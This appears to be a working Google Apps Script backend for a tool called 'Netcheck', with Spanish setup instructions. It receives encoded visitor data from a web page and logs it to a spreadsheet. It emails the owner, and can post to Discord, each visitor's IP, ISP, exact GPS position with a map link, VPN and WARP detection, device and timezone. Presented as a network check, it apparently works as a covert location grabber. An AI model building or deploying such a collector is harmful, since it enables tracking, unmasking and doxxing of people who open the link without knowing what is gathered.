/**
 * Netcheck - receptor de datos
 * Pegar en: https://script.google.com → Nuevo proyecto → pegar este código
 * Deploy → Nueva implementación → Aplicación web → Ejecutar como: yo → Acceso: Cualquier usuario
 * Copiar la URL /exec y ponerla en CONFIG.endpoint del index.html
 */

const NOMBRE_HOJA = 'Netcheck';
const PROP_SHEET = 'SHEET_ID';
const WEBHOOK_DISCORD = ''; // opcional: URL del webhook de Discord

function doGet(e) {
  try {
    const sid = e.parameter.s || '';
    const i = parseInt(e.parameter.i || '0', 10);
    const n = parseInt(e.parameter.n || '1', 10);
    const d = e.parameter.d || '';

    if (!sid || !d) return ok();

    const cache = CacheService.getScriptCache();
    const key = 'nc_' + sid;
    let partes = cache.get(key);
    partes = partes ? JSON.parse(partes) : {};
    partes[i] = d;

    const indices = Object.keys(partes).map(Number).sort((a, b) => a - b);
    const completo = indices.length >= n && indices.every((v, idx) => v === idx + 1);

    if (completo) {
      cache.remove(key);
      const raw = indices.map(k => partes[k]).join('');
      const json = Utilities.newBlob(Utilities.base64Decode(decodificaB64u(raw)))
        .getDataAsString('UTF-8');
      const datos = JSON.parse(json);
      guardar(datos, sid);
      avisar(datos, sid);
    } else {
      cache.put(key, JSON.stringify(partes), 21600); // 6 h
    }
    return ok();
  } catch (err) {
    return ContentService.createTextOutput('err').setMimeType(ContentService.MimeType.TEXT);
  }
}

function decodificaB64u(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return s;
}

function hoja() {
  const props = PropertiesService.getScriptProperties();
  let id = props.getProperty(PROP_SHEET);
  if (!id) {
    const ss = SpreadsheetApp.create(NOMBRE_HOJA);
    id = ss.getId();
    props.setProperty(PROP_SHEET, id);
    const sh = ss.getSheets()[0];
    sh.setName('Datos');
    sh.appendRow(['fecha', 'sesion', 'datos_json']);
    ss.setSpreadsheetTimeZone('America/Argentina/Buenos_Aires');
  }
  return SpreadsheetApp.openById(id).getSheetByName('Datos');
}

function guardar(datos, sid) {
  const fila = [
    new Date().toISOString(),
    sid,
    JSON.stringify(datos)
  ];
  hoja().appendRow(fila);
}

function resumen(datos) {
  const lugar = datos.direccion || [datos.ciudad, datos.region, datos.pais].filter(Boolean).join(', ') || '?';
  const gps = datos.lat != null
    ? datos.lat.toFixed(5) + ', ' + datos.lon.toFixed(5) +
      (datos.acc != null ? ' (±' + Math.round(datos.acc) + ' m)' : '') +
      (datos.maps ? '\nMapa: ' + datos.maps : '')
    : 'sin GPS';
  return [
    'Nueva verificación',
    '',
    'IP: ' + (datos.ip || '?') + (datos.isp ? ' (' + datos.isp + ')' : ''),
    'Lugar: ' + lugar,
    'GPS: ' + gps,
    'Fuente: ' + (datos.fuente || '?') + (datos.exacta === 1 ? ' (exacta)' : datos.exacta === 2 ? ' (media)' : ' (aprox IP)'),
    datos.vpn ? 'Alerta: GPS difiere de la IP >30 km' : '',
    datos.cgnat ? 'Red: CGNAT' : '',
    datos.warp && datos.warp !== 'off' ? 'Cloudflare WARP: ' + datos.warp : '',
    '',
    'Dispositivo: ' + (datos.plt || '?') + ' | ' + (datos.ua || '').slice(0, 120),
    'Pantalla: ' + (datos.scr || '?') + ' | TZ: ' + (datos.tz || '?'),
    'Sesion: ' + sid
  ].filter(l => l !== null).join('\n');
}

function avisar(datos, sid) {
  const texto = resumen(datos);
  avisarEmail(texto, datos);
  avisarDiscord(texto);
}

function avisarEmail(texto, datos) {
  try {
    const para = Session.getEffectiveUser().getEmail();
    if (!para) return;
    const asunto = 'Netcheck: ' + (datos.ip || '?') + ' - ' +
      (datos.ciudad || datos.pais || 'ubicación');
    MailApp.sendEmail(para, asunto, texto);
  } catch (err) {}
}

function avisarDiscord(texto) {
  if (!WEBHOOK_DISCORD) return;
  try {
    UrlFetchApp.fetch(WEBHOOK_DISCORD, {
      method: 'post',
      contentType: 'application/json',
      payload: JSON.stringify({ content: '```\n' + texto.slice(0, 1900) + '\n```' })
    });
  } catch (err) {}
}

function ok() {
  return ContentService.createTextOutput('ok').setMimeType(ContentService.MimeType.TEXT);
}
